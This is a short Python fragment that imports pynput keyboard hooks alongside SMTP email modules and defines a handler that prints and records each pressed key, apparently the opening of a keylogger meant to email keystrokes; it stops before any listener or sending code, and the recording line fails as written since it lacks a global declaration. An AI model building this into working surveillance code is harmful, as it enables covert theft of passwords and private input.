import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

keys_pressed = ""

def on_press(key):
    try:
        print(f"Key {key.char} pressed")
        keys_pressed = keys_pressed + key.char
    except AttributeError:
        print(f"Special key {key} pressed")